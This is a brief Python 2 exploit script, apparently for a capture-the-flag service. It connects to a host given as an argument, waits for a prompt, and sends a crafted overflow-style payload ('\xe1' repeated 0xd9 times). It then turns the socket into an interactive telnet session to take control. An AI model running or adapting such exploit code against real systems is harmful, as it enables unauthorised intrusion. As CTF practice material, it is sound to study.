import socket
from struct import pack,unpack
from ctypes import c_int32
import telnetlib
import time,random
import sys

LOCAL = ('localhost',31336)
LOCAL = (sys.argv[1],31335)
# LOCAL = ('128.199.133.96',31331)
BUFFER = 4096





s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(LOCAL)

def recv_until(str,debug=0):
    recv_ = ''
    while not str in recv_:
        tmp = s.recv(BUFFER)
        recv_ += tmp
        if debug:
            print tmp
        continue
    return recv_

recv_until('(type 0')
raw_input("?")

payload = "\xe1"*0xd9+ "0"

s.send(payload+'\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
